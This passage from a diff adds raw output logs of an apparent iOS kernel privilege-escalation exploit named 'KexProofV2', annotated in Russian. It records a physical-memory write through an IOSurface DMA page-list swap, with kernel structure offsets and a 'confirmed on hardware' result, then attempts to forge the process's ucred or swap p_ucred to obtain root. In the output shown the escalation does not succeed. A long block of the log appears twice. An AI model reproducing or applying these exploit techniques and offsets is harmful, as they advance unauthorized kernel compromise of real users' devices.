+    hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148 | соседи: 0x0000c04000000020 0x000000040400c147
+    hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000 | соседи: 0x000001000efd0000 0x0000000000004000
+    hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000 | соседи: 0x00000100007bc000 0x0000000000004000
+  измерение: попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  rangesVA=0 — одиночный путь пропускаем, полагаемся на DEP-детектор
+  жду execute victim-опа (backlog ~800 async)…
+  dst пиксели после execute: ненулевых = 1024 — DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)
+  [OPC] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  [DSX] planeDesc=0xffffffdf4485e3e8 type(0x20&0xf0)=0x10
+    dsx entry+0: addr=000000000000000000 len=0x80000 → PA 0
+    dsx entry+0x10: addr=000000000000000000 len=0x20000 → PA 0
+    dsx entry+0x20: addr=0xffffffedfcc54000 len=0x4000 → PA 0x10050500000
+    dsx entry+0x30: addr=0x000000066e8dc000 len=0x100000 → PA 0
+    dsx entry+0x40: addr=0xffffffedfede4000 len=0x4000 → PA 0x100e29e0000
+    dsx entry+0x50: addr=0x000000066e9dc000 len=0x100000 → PA 0
+    dsx entry+0x60: addr=0x000000066eadc000 len=0x100000 → PA 0
+  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)
+  [DSY] rangeObj=0xffffffedf8c908a0 vt(file)=0 (ждём 0x7b33db8)
+  [SPC-post] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec-post+0: 000000000000000000
+    spec-post+0x8: 0x0000000000080000
+    spec-post+0x10: 000000000000000000
+    spec-post+0x18: 0x0000000000020000
+    spec-post+0x20: 0xffffffedfcc54000
+    spec-post+0x28: 0x0000000000004000
+    spec-post+0x30: 0x000000066e8dc000
+    spec-post+0x38: 0x0000000000100000
+    spec-post+0x40: 0xffffffedfede4000
+    spec-post+0x48: 0x0000000000004000
+    spec-post+0x50: 0x000000066e9dc000
+    spec-post+0x58: 0x0000000000100000
+  [RETRY #1] submit kr=0x0 ctl-changed=1024 слот#0=000000000000000000
+      buffer пост-submit: flags=0xc0 entry0=0x000000040405088d entry1=0x000000040400c147 — ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)
+=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (1024 dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===
+  [FORGE] proc_ro=0xffffffdf41f82460 ucred=0xffffffdf41fc87c0 (getuid=501 getgid=501)
+  [FORGE] PAPT сток: tbl=0xfffffff02bd6cc00 n=15
+    stock[0]: 0x00000100082e8000 0xfffffff050000000 0x0000000000076ab8
+  [FORGE] PAPT охота: 11 pointee-кандидатов
+  [FORGE] PAPT найдена @ 0xfffffff02bd6cc00 (fmt=24-B n=15)
+  [FORGE] walker встал на L3 tte=0x1000b8dbf90 — physread через DART
+  [FORGE] leaf PTE = 0x5a5a5a5a5a5a5a5a
+  [PSWAP] p_ucred field: VA=0xffffffdf41f82488 PA=0 (walk deadly — мимо)
+  [PHYSWRITE8v2] target=0x101c86c4000+0 payload=0x0460010142234603 kr=0x0
+  [TBL-TEST] L3[0] нашего proc: readback=000000000000000000 (ждём 0x0460010142234603) → ДРОП (CTRR фенсит и их)
+  [SCAN-Z2] старт: uoff=0x7c0 label=0xc09dffdf41ddacc0 uid=501 roOff=0x2488 ucF=0xffffffdf41fc87c0 frames=0x780b6
+  [SCAN-Z2] скип PA-спаны: SPTM 0x10022af0000..0x10022be4000 TXM 0x10012af0000..0x10012b54000
+  [SCAN-Z2] калибровка из кэша [CAL]: PAPT ✓
+  [SCAN-Z2] whitelist контент-чтений: типы {0x10, 11, 11}, старт idx=0x10000 (PA>=0x10042af0000)
+  [SCAN-Z2] прогресс 0x10000/0x780b6 (чтений 0)
+  [frame-type census] type=0xe (pa=0x10042b10000)
+  [frame-type census] type=0x36 (pa=0x100430f0000)
+  [frame-type census] type=0x35 (pa=0x10043660000)
+  [frame-type census] type=0x18 (pa=0x100437dc000)
+  [frame-type census] type=0x37 (pa=0x10043ecc000)
+  [frame-type census] type=0x34 (pa=0x1004594c000)
+  [frame-type census] type=0x30 (pa=0x10047fc0000)
+  [frame-type census] type=0x17 (pa=0x1005ffe0000)
+  [SCAN-Z2] прогресс 0x18000/0x780b6 (чтений 32768)
+  [frame-type census] type=0x33 (pa=0x10062f1c000)
+  [frame-type census] type=0x31 (pa=0x100630bc000)
+  [frame-type census] type=0x14 (pa=0x10066554000)
+  [frame-type census] type=0x12 (pa=0x1006656c000)
+  [frame-type census] type=0x10 (pa=0x10072c84000)
+  [SCAN-Z2] прогресс 0x20000/0x780b6 (чтений 65536)
+  [SCAN-Z2] ★ proc_ro поле: pa=0x1009c3da488 (p_ucred==ucF + соседи) [тип кадра=24] — PSWAP-B вооружён
+  [SCAN-Z2] прогресс 0x28000/0x780b6 (чтений 98304)
+  [SCAN-Z2] прогресс 0x30000/0x780b6 (чтений 131072)
+  [SCAN-Z2] прогресс 0x38000/0x780b6 (чтений 163840)
+  [SCAN-Z2] прогресс 0x40000/0x780b6 (чтений 196608)
+  [SCAN-Z2] прогресс 0x48000/0x780b6 (чтений 229376)
+  [SCAN-Z2] прогресс 0x50000/0x780b6 (чтений 262144)
+  [frame-type census] type=0x32 (pa=0x10156278000)
+  [SCAN-Z2] прогресс 0x58000/0x780b6 (чтений 294912)
+  [SCAN-Z2] ucred-кандидат pa=0x10166614000: label+uid сошлись, live-сверка — мимо (расхождение @+0)
+  [SCAN-Z2] образец чужого ucred сохранён: pa=0x10166614000 (тип 24) — VMPROBE будет
+  [frame-type census] type=0x2f (pa=0x1017f9cc000)
+  [frame-type census] type=0x38 (pa=0x1017f9d0000)
+  [SCAN-Z2] прогресс 0x60000/0x780b6 (чтений 327680)
+  [SCAN-Z2] прогресс 0x68000/0x780b6 (чтений 360448)
+  [SCAN-Z2] прогресс 0x70000/0x780b6 (чтений 393216)
+  [SCAN-Z2] прогресс 0x78000/0x780b6 (чтений 425984)
+  [SCAN-Z2] финиш: кадров=0x780b6 чтений=426166 ucredPA=0 roFieldPA=0x1009c3da488 — ЦЕЛЬ НАЙДЕНА ★
+  [SCAN-Z2] гистограмма типов (кадров 491702, нет-таблицы 0): 11:338418 14:70625 16:11 17:384 18:1 19:6526 20:5 23:89 24:44 33:9171 47:1 48:9 49:7 50:2 51:8 52:9 53:21 54:40 55:794 56:1
+  [SCAN-Z2-BAND] kernel-проход 256MB..1GB (whitelist + 0x37)
+  [SCAN-Z2-BAND] прогресс 0x4000 (чтений 1)
+  [SCAN-Z2-BAND] прогресс 0x6000 (чтений 8193)
+  [frame-type census] type=0x2e (pa=0x1001f36c000)
+  [SCAN-Z2-BAND] прогресс 0x8000 (чтений 16385)
+  [SCAN-Z2-BAND] прогресс 0xa000 (чтений 24577)
+  [SCAN-Z2-BAND] прогресс 0xc000 (чтений 32769)
+  [SCAN-Z2-BAND] прогресс 0xe000 (чтений 40961)
+  [SCAN-Z2-BAND] финиш: чтений=49152 ucredPA=0 roFieldPA=0x1009c3da488
+  [T18-ENUM] перебор кадров типа 24 из frame table (наш ucred — в зоне этого типа)
+  [frame-type census] type=0x27 (pa=0x10004410000)
+  [frame-type census] type=0x5 (pa=0x10004428000)
+  [frame-type census] type=0x3 (pa=0x10007c00000)
+  [frame-type census] type=0x4 (pa=0x10007d10000)
+  [frame-type census] type=0x2 (pa=0x10007d64000)
+  [frame-type census] type=0x28 (pa=0x10007da4000)
+  [frame-type census] type=0x1 (pa=0x100095dc000)
+  [frame-type census] type=0x29 (pa=0x100095f0000)
+  [frame-type census] type=0x2a (pa=0x100096b4000)
+  [frame-type census] type=0xa (pa=0x100096fc000)
+  [frame-type census] type=0x39 (pa=0x10009784000)
+  [frame-type census] type=0x2c (pa=0x1000978c000)
+  [frame-type census] type=0x2b (pa=0x100097ac000)
+  [frame-type census] type=0x3a (pa=0x100097b0000)
+  [frame-type census] type=0x16 (pa=0x1000bef4000)
+  [frame-type census] type=0x1c (pa=0x1000bff8000)
+  [frame-type census] type=0x1b (pa=0x1000bffc000)
+  [T18-ENUM] кадров типа 24: всего 99, высоких 57, низких 16
+  [T18-ENUM] низкий кандидат[0] pa=0x1000b8d0000
+  [T18-ENUM] низкий кандидат[1] pa=0x1000b8dc000
+  [T18-ENUM] низкий кандидат[2] pa=0x1000bc34000
+  [T18-ENUM] низкий кандидат[3] pa=0x1000bc48000
+  [T18-ENUM] низкий кандидат[4] pa=0x1000bf38000
+  [T18-ENUM] низкий кандидат[5] pa=0x1000bf3c000
+  [T18-ENUM] низкий кандидат[6] pa=0x1000bf40000
+  [T18-ENUM] низкий кандидат[7] pa=0x1000bf48000
+  [T18-ENUM] низкий кандидат[8] pa=0x1000bf4c000
+  [T18-ENUM] низкий кандидат[9] pa=0x1000bf50000
+  [T18-ENUM] низкий кандидат[10] pa=0x1000bf60000
+  [T18-ENUM] низкий кандидат[11] pa=0x1000bf64000
+  [T18-ENUM] низкий кандидат[12] pa=0x1000bf68000
+  [T18-ENUM] низкий кандидат[13] pa=0x1000bf6c000
+  [T18-ENUM] низкий кандидат[14] pa=0x1000bf70000
+  [T18-ENUM] низкий кандидат[15] pa=0x1000bf74000
+  [T18-ENUM] низких 16 — пробуем первый pa=0x1000b8d0000 (список выше для добора)
+  [PSWAP-B] KVA-верификация маркером: papt=✓ linear=✗ → KVA=0xfffffff1609a4000
+  [PSWAP-B] forge page: PA=0x10118c8c000 KVA=0xfffffff1609a4000 → поле 0x1009c3da488
+  [PHYSWRITE8v2] target=0x1009c3d8000+0x2488 payload=0xfffffff1609a4000 kr=0x0
+  [PSWAP-B] запись=kr=0 readback=0xffffffdf41fc87c0 (ждём 0xfffffff1609a4000) → НЕ ПРИЛИПЛО
+  [FORGE] валидация ПРОПУЩЕНА (VMPROBE-on-faith) — INPL пишет и проверяет через readback
+  [FORGE] pageVA=0xffffffdf41fc8000 pagePA=0x1000b8d0000 uoff=0x7c0 — валидация PA: СОШЛАСЬ
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [INPL] physwrite8: 00000 | readback cr_uid=501 groups0=501 cr_label=0xc09dffdf41ddacc0 | getuid()=501 getgid()=501
+  [INPL] не прилипло — откат не нужен (контент не изменился), иду в тяжёлый форж
+  [FORGE] DEP-хиты перепатчены на ucredPFN (1 шт)
+  [FORGE] victim#2 submit (ucredPA, fresh pipe): kr=0x0 — жду DMA в ucred
+  [FORGE] getuid()=501 getgid()=501 | cr_uid=501 cr_label=0xc09dffdf41ddacc0
+
+
+========== FILE: kexproof-e9.txt (1275 байт, mtime=2026-10-06 05:34:58 +0000) ==========
+
+=== EXP-09: root через подмену указателя p_ucred (heap-only) ===
+  наш pid: 491
+  наш proc (proc_self): 0x0000000000000000
+  наш proc по pid 491 @ 0xffffffe2d77dd660 (fast walk, узлов=0)
+  proc+0xD8 = 0x0000000000000000 (мёртвое поле на 15.2+; ucred уехал в proc_ro)
+  proc_ro: raw=0xffffffdf41f82460 → 0xffffffdf41f82460
+  proc_ro.ucred @ 0xffffffdf41f82488: raw=0xffffffdf41fc87c0 → 0xffffffdf41fc87c0
+  текущий ucred: uid=501 gid=501 (getuid()=501 getgid()=501)
+  цепь: task=0xffffffe2d77ddda0 map=0xffffffdef28b0d60 pmap=0xffffffdf420a7040 ttep=0x101aa45c000
+  страница: userVA=0x1017d4000 pa=0x1010f668000 → kernel VA (ptov)=0xfffffff157380000
+  чтение форжа по kernel VA: 0xffffffe0269c7490 (ждём начало скопированного ucred)
+  оригинальный p_ucred = 0xffffffdf41fc87c0
+  [E9] kwrite по proc_ro ПРОПУЩЕН (RO-зона, ZC_READONLY) — readback=0xffffffdf41fc87c0 (оригинал на месте, это ок)
+FAIL: heap-only swap через kwrite нежизнеспособен на 18.6 — proc_ro RO-зона.
+Используй авто-цепь PHYSWRITE: INPL (in-place ucred) или PSWAP-B (DMA в поле p_ucred).
+
+
+========== FILE: kexproof-paswap.txt (50897 байт, mtime=2026-10-06 05:35:59 +0000) ==========
+=== IOSurface backing-PA swap: physwrite через DMA ===
+  [DCPAV] DCPAVControllerProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVDeviceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVServiceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVVideoInterfaceProxy: open kr=0xe00002e2
+  [DCPAV] DCPAVAudioInterfaceProxy: сервис НЕ найден
+  surfaces: srcID=15 dstID=12 (подменяем backing у dst)
+  процесс "KexProofV2" (p_name="KexProofV2") @ 0xffffffe2d77dd660 (узлов=0)
+  контрольная страница: VA=0x1017dc000 PA=0x10142234000 (заполнена 0xCC)
+  [CAL] physmap-алиасы (рано, маркер жив): linear=0xaa0103f9 papt=0xcafebabe → PAPT ✓
+  ctlPA валидация: phystokv(0x10142234000)=0xcafebabe → ВЕРНО
+  backing PA dst = 0x10030520000 (vtophys пикселей VA=0x10450c000), маркер по phystokv: 0x41544159 → ПОДТВЕРЖДЁН
+  SCAN A (после create, до churn/submit):
+  frame table: raw=0xfffffff05078c000 → VA 0xfffffff05078c000
+    [A] hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148
+    [A] hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000
+    [A] hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000
+  [A] попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  isTable=0xffffffed0cd8c000 (звенья: proc_ro=0xffffffdf41f82460 task=0xffffffe2d77ddda0 itk=0xd1e6ffe027ed2728)
+  ip_kobject oracle: task port VA=0xffffffe10b4aec50 selfTask=0xffffffe2d77ddda0 → ip_kobject @ +0x48 (статика +0x48)
+  порт-маршрут: smp=0x347e77 kobj=0xffffffe028843120 vt=0xfffffff04c797d68 (file 0xfffffff007b03d68; SendRight ждём 0xfffffff04cb834c8)
+    kobj+0x00: raw=0x128b7ff04c797d68 untag=0xfffffff04c797d68 → [+0x10]=0x4d297234 surfFast=0
+    kobj+0x08: raw=0x0000000100000001 untag=0x0000000100000001
+    kobj+0x10: raw=0x0000010122000000 untag=0x0000010122000000
+    kobj+0x18: raw=000000000000000000 untag=000000000000000000
+    kobj+0x20: raw=0xffffffe028840c60 untag=0xffffffe028840c60 → [+0x10]=0x22000000 surfFast=0
+    kobj+0x28: raw=0xffffffe10864e860 untag=0xffffffe10864e860 → [+0x10]=0 surfFast=0
+    kobj+0x30: raw=0x52c47fe2d9864fa0 untag=0xffffffe2d9864fa0 → [+0x10]=0xf41ec400 surfFast=0
+    IOMachPort: fPort=0xffffffe10864e860 kotype=0x1b fObject=0xffffffe2d9864fa0 vt=0xfffffff04cb834c8 (file 0xfffffff007eef4c8 = SendRight!)
+    SendRight ✓: owner(Root)=0xffffffe1f41ec400 IOSurface=0xffffffe10e25ad40 ([surf+0x10]=0xc ждём 12) surfFast=0
+  ★ smp IOMachPort-хоп → IOSurface 0xffffffe10e25ad40
+  ★ порт-маршрут дал surfVA=0xffffffe10e25ad40 — слоты/подмена ДО submit
+  IOSurface 0xffffffe10e25ad40: rangeObj(+0x178)=0xffffffedf8c908a0 plane(+0x30)=0xffffffdf4485e3e8 ranges(+0x360)=0 rangeCount(+0x3a4)=0
+  planeDesc vtable: 0xfffffff04c7c7db8 (file 0xfffffff007b33db8) — класс IOMD
+    IOMD lvl0: md=0xffffffdf4485e3e8 [+0x60]=0xffffffe10e3e9fe0 count=1 [0]=000000000000000000 [8]=0x0000000000080000
+    pd+0000: 0x44a67ff04c7c7db8
+    pd+0x08: 0x0000000000010002
+    pd+0x10: 0xffffffe0264f9300
+    pd+0x18: 0xffffffe1f3b0b580
+    pd+0x20: 0x0000000000510513
+    pd+0x28: 0xffffffe028713880
+    pd+0x30: 0x000000000058004e
+    pd+0x38: 000000000000000000
+    pd+0x40: 000000000000000000
+    pd+0x48: 000000000000000000
+    pd+0x50: 0x0000000000080000
+    pd+0x58: 000000000000000000
+    pd+0x60: 0xffffffe10e3e9fe0
+    pd+0x68: 0x0000000000000001
+    pd+0x70: 0xffffffe2d9a801e0
+    pd+0x78: 000000000000000000
+    pd+0x80: 000000000000000000
+    pd+0x88: 0x0000000100000000
+    pd+0x90: 0xffffffe10d754250
+    pd+0x98: 0x0406e1fe00000020
+    pd+0xa0: 000000000000000000
+    pd+0xa8: 0xffffffe2da0d4b70
+    pd+0xb0: 000000000000000000
+    pd+0xb8: 000000000000000000
+    pd+0xc0: 0x0000000000080000
+    pd+0xc8: 0x0000000000004000
+    pd+0xd0: 0x0000000000110063
+    pd+0xd8: 000000000000000000
+    pd+0xe0: 0x0000000000000008
+    pd+0xe8: 0xdea87ff04c7c7db8
+    pd+0xf0: 0x0000000000010004
+    pd+0xf8: 0xffffffe0264faf20
+  IOSurface найден, но pfn-слотов нет — уходим в старые пути
+  [CHAIN-S] srcVA=0xffffffe10e25b100 pd=0xffffffdf4484f520 type=0x10 buf=0xffffffe02813cc80 count=0x20 entry0=0x000000040400ae68 — маркеры сошлись (physread вооружён)
+  [CHAIN] pd=0xffffffdf4485e3e8 vt=0xfffffff04c7c7db8 type=0x10 hdr=0xffffffe10d754250 buf=0xffffffe02813c800 count=0x20 flags=0xc0 — маркеры сошлись, патчим entries
+  [CHAIN] ★ entry[0] @ 0xffffffe02813c830: 0x000000040400c148 → ctlPFN 0x405088d (зона: не зона/VM)
+      readback: 0x000000040405088d — ПРИЛИПЛО
+  [PH] VAD (VA-field deputy) — старт
+  [VAD] VA-поле не найдено (пулов=15, полей проверено=66, physmap-скип=60) — следующий шаг: pv_head/второй уровень
+  [PH] PAR (parent-ranges) — старт
+  [PAR] parentMD=0xffffffe10e3e9fe0 arr=0x66eadc000 count=32768
+  [VDB] [planeDesc+0xb8] = 000000000000000000 (ноль — ranges-based)
+  [VDB] vmctx [0x7b33f28]=0xffffffde0c3ba890 (sym 0xfffffff04c7c7f28)
+    vmctx+0: 0x0000000033000000
+    vmctx+0x8: 0x0000000000420000
+    vmctx+0x10: 0xffffffde0c3beed0
+    vmctx+0x18: 0xffffffde0c3bfdd0
+    vmctx+0x20: 0xffffffdc00000000
+    vmctx+0x28: 0xfffffffbffffffff
+    vmctx+0x30: 0x0000000e00000883
+    vmctx+0x38: 0xffffffde0c452d60
+    vmctx+0x40: 0x6ed17ff04f714170
+    vmctx+0x48: 0x00000014c5988000
+    vmctx+0x50: 0x7fffffffffffffff
+    vmctx+0x58: 0x7fffffffffffffff
+    vmctx+0x60: 0x0000000fc0000000
+    vmctx+0x70: 0x00000000000007c7
+    vmctx+0xc0: 0xffffffde0caf04a0
+    vmctx+0xc8: 0xffffffdef292dac0
+    vmctx+0xd0: 0xffffffde0c3c14e0
+    vmctx+0xd8: 0x000f47b900000080
+    vmctx+0xe8: 0x0000000000000001
+    vmctx+0xf0: 0x0000000033000000
+    vmctx+0xf8: 0x0000000000420000
+    vmctx+0x100: 0xffffffde0c5d90d0
+    vmctx+0x108: 0xffffffde0c462890
+    vmctx+0x110: 0xffffffedf8c88000
+    vmctx+0x118: 0xffffffee58c88000
+    vmctx+0x120: 0x0001000e00000508
+    vmctx+0x128: 0xffffffde0c86c560
+    vmctx+0x130: 0x0bb8fff04f714170
+    vmctx+0x138: 0x0000000006648000
+    vmctx+0x140: 0x7fffffffffffffff
+    vmctx+0x148: 0x7fffffffffffffff
+    vmctx+0x150: 0x0000000fc0000000
+    vmctx+0x160: 0x0000000000000002
+    vmctx+0x1b0: 0xffffffde0c99d8f0
+    vmctx+0x1b8: 0xffffffdef292aa00
+    vmctx+0x1c0: 0xffffffdef2407260
+    vmctx+0x1c8: 0x0000194000000080
+    vmctx+0x1d8: 0x0000000000000011
+    vmctx+0x1e0: 0x0000000033000000
+    vmctx+0x1e8: 0x0000000000420000
+    vmctx+0x1f0: 0xffffffde0c3baa80
+    vmctx+0x1f8: 0xffffffde0c3baa80
+  [VDB2] маркер-hits по surf-pointees: 0
+    surf+0x8: 0x0000000200000001 (arena?)
+    surf+0x70: 0x0000000001010004
+    surf+0x80: 0x0000000042475241 (arena?)
+    surf+0x3b8: 0x000001eb0005892d (PA?)
+    surf+0x3c8: 0x0000000200000001 (arena?)
+    pd+0x20: 0x0000000000510513
+    pd+0x30: 0x000000000058004e
+    pd+0x88: 0x0000000100000000 (arena?)
+    pd+0xd0: 0x0000000000110063
+  [PH] OWN (owner-MD база) — старт
+  [OWN] A: [pd+0x28]=0xffffffe028713880 [P]=0x1 (signed — не пишем)
+  [OWN] B: [pd+0x90]=0xffffffe10d754250 recs=0xffffffe02813c800 ownerMD=0
+  [PH] RMD (root-MD page-list) — старт
+  [RMD] pd=0xffffffdf4485e3e8 rootMD=0xffffffe10e3e9fe0
+  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора
+  victim#1 async submit (real src): kr=0x0 — mapping кэшируется на pipe
+  [SPC] pd=0xffffffdf4485e3e8 spec([pd+0x60])=0xffffffe10e3e9fe0
+  [SPC] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec+0: 000000000000000000
+    spec+0x8: 0x0000000000080000
+    spec+0x10: 0x0000000483f88000
+    spec+0x18: 0x0000000000100000
+    spec+0x20: 0xffffffedfcc54000
+    spec+0x28: 0x0000000000004000
+    spec+0x30: 0x000000066e8dc000
+    spec+0x38: 0x0000000000100000
+    spec+0x40: 0xffffffedfede4000
+    spec+0x48: 0x0000000000004000
+    spec+0x50: 0x000000066e9dc000
+    spec+0x58: 0x0000000000100000
+  [SPC] fallback: UC=0xffffffdf440cdcd0 pipe=0xffffffe1f38b2400 node=0xffffffe0269c9648
+  [SPC] spec+0x58 с pfn32 нигде не найден
+  [OPC-E] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  резолв: surfVA=0xffffffe10e25ad40 rangesVA=0
+  SCAN B (после execute): скан heap на формы backingPA — сравниваем со SCAN A (create-wired vs execute-wired):
+    hit#1 форма4 @ 0xfffffff056444830: 0x000000040400c148 | соседи: 0x0000c04000000020 0x000000040400c147
+    hit#2 форма1 @ 0xfffffff1f8c220a8: 0x0000010030520000 | соседи: 0x000001000efd0000 0x0000000000004000
+    hit#3 форма1 @ 0xfffffff1fe902678: 0x0000010030520000 | соседи: 0x00000100007bc000 0x0000000000004000
+  измерение: попаданий=3 (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)
+  rangesVA=0 — одиночный путь пропускаем, полагаемся на DEP-детектор
+  жду execute victim-опа (backlog ~800 async)…
+  dst пиксели после execute: ненулевых = 1024 — DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)
+  [OPC] UC=0xffffffdf440cdcd0 prov=0xffffffe10dafd900 op=0
+  [DSX] planeDesc=0xffffffdf4485e3e8 type(0x20&0xf0)=0x10
+    dsx entry+0: addr=000000000000000000 len=0x80000 → PA 0
+    dsx entry+0x10: addr=000000000000000000 len=0x20000 → PA 0
+    dsx entry+0x20: addr=0xffffffedfcc54000 len=0x4000 → PA 0x10050500000
+    dsx entry+0x30: addr=0x000000066e8dc000 len=0x100000 → PA 0
+    dsx entry+0x40: addr=0xffffffedfede4000 len=0x4000 → PA 0x100e29e0000
+    dsx entry+0x50: addr=0x000000066e9dc000 len=0x100000 → PA 0
+    dsx entry+0x60: addr=0x000000066eadc000 len=0x100000 → PA 0
+  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)
+  [DSY] rangeObj=0xffffffedf8c908a0 vt(file)=0 (ждём 0x7b33db8)
+  [SPC-post] spec+0x58=0x0000000000100000 (ждём pfn32=0x400c148)
+    spec-post+0: 000000000000000000
+    spec-post+0x8: 0x0000000000080000
+    spec-post+0x10: 000000000000000000
+    spec-post+0x18: 0x0000000000020000
+    spec-post+0x20: 0xffffffedfcc54000
+    spec-post+0x28: 0x0000000000004000
+    spec-post+0x30: 0x000000066e8dc000
+    spec-post+0x38: 0x0000000000100000
+    spec-post+0x40: 0xffffffedfede4000
+    spec-post+0x48: 0x0000000000004000
+    spec-post+0x50: 0x000000066e9dc000
+    spec-post+0x58: 0x0000000000100000
+  [RETRY #1] submit kr=0x0 ctl-changed=1024 слот#0=000000000000000000
+      buffer пост-submit: flags=0xc0 entry0=0x000000040405088d entry1=0x000000040400c147 — ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)
+=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (1024 dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===
+  [FORGE] proc_ro=0xffffffdf41f82460 ucred=0xffffffdf41fc87c0 (getuid=501 getgid=501)
+  [FORGE] PAPT сток: tbl=0xfffffff02bd6cc00 n=15
+    stock[0]: 0x00000100082e8000 0xfffffff050000000 0x0000000000076ab8
+  [FORGE] PAPT охота: 11 pointee-кандидатов
+  [FORGE] PAPT найдена @ 0xfffffff02bd6cc00 (fmt=24-B n=15)
+  [FORGE] walker встал на L3 tte=0x1000b8dbf90 — physread через DART
+  [FORGE] leaf PTE = 0x5a5a5a5a5a5a5a5a
+  [PSWAP] p_ucred field: VA=0xffffffdf41f82488 PA=0 (walk deadly — мимо)
+  [PHYSWRITE8v2] target=0x101c86c4000+0 payload=0x0460010142234603 kr=0x0
+  [TBL-TEST] L3[0] нашего proc: readback=000000000000000000 (ждём 0x0460010142234603) → ДРОП (CTRR фенсит и их)
+  [SCAN-Z2] старт: uoff=0x7c0 label=0xc09dffdf41ddacc0 uid=501 roOff=0x2488 ucF=0xffffffdf41fc87c0 frames=0x780b6
+  [SCAN-Z2] скип PA-спаны: SPTM 0x10022af0000..0x10022be4000 TXM 0x10012af0000..0x10012b54000
+  [SCAN-Z2] калибровка из кэша [CAL]: PAPT ✓
+  [SCAN-Z2] whitelist контент-чтений: типы {0x10, 11, 11}, старт idx=0x10000 (PA>=0x10042af0000)
+  [SCAN-Z2] прогресс 0x10000/0x780b6 (чтений 0)
+  [SCAN-Z2] прогресс 0x18000/0x780b6 (чтений 32768)
+  [SCAN-Z2] прогресс 0x20000/0x780b6 (чтений 65536)
+  [SCAN-Z2] ★ proc_ro поле: pa=0x1009c3da488 (p_ucred==ucF + соседи) [тип кадра=24] — PSWAP-B вооружён
+  [SCAN-Z2] прогресс 0x28000/0x780b6 (чтений 98304)
+  [SCAN-Z2] прогресс 0x30000/0x780b6 (чтений 131072)
+  [SCAN-Z2] прогресс 0x38000/0x780b6 (чтений 163840)
+  [SCAN-Z2] прогресс 0x40000/0x780b6 (чтений 196608)
+  [SCAN-Z2] прогресс 0x48000/0x780b6 (чтений 229376)
+  [SCAN-Z2] прогресс 0x50000/0x780b6 (чтений 262144)
+  [SCAN-Z2] прогресс 0x58000/0x780b6 (чтений 294912)
+  [SCAN-Z2] ucred-кандидат pa=0x10166614000: label+uid сошлись, live-сверка — мимо (расхождение @+0)
+  [SCAN-Z2] образец чужого ucred сохранён: pa=0x10166614000 (тип 24) — VMPROBE будет
+  [SCAN-Z2] прогресс 0x60000/0x780b6 (чтений 327680)
+  [SCAN-Z2] прогресс 0x68000/0x780b6 (чтений 360448)
+  [SCAN-Z2] прогресс 0x70000/0x780b6 (чтений 393216)
+  [SCAN-Z2] прогресс 0x78000/0x780b6 (чтений 425984)
+  [SCAN-Z2] финиш: кадров=0x780b6 чтений=426166 ucredPA=0 roFieldPA=0x1009c3da488 — ЦЕЛЬ НАЙДЕНА ★
+  [SCAN-Z2] гистограмма типов (кадров 491702, нет-таблицы 0): 11:338418 14:70625 16:11 17:384 18:1 19:6526 20:5 23:89 24:44 33:9171 47:1 48:9 49:7 50:2 51:8 52:9 53:21 54:40 55:794 56:1
+  [SCAN-Z2-BAND] kernel-проход 256MB..1GB (whitelist + 0x37)
+  [SCAN-Z2-BAND] прогресс 0x4000 (чтений 1)
+  [SCAN-Z2-BAND] прогресс 0x6000 (чтений 8193)
+  [SCAN-Z2-BAND] прогресс 0x8000 (чтений 16385)
+  [SCAN-Z2-BAND] прогресс 0xa000 (чтений 24577)
+  [SCAN-Z2-BAND] прогресс 0xc000 (чтений 32769)
+  [SCAN-Z2-BAND] прогресс 0xe000 (чтений 40961)
+  [SCAN-Z2-BAND] финиш: чтений=49152 ucredPA=0 roFieldPA=0x1009c3da488
+  [T18-ENUM] перебор кадров типа 24 из frame table (наш ucred — в зоне этого типа)
+  [T18-ENUM] кадров типа 24: всего 99, высоких 57, низких 16
+  [T18-ENUM] низкий кандидат[0] pa=0x1000b8d0000
+  [T18-ENUM] низкий кандидат[1] pa=0x1000b8dc000
+  [T18-ENUM] низкий кандидат[2] pa=0x1000bc34000
+  [T18-ENUM] низкий кандидат[3] pa=0x1000bc48000
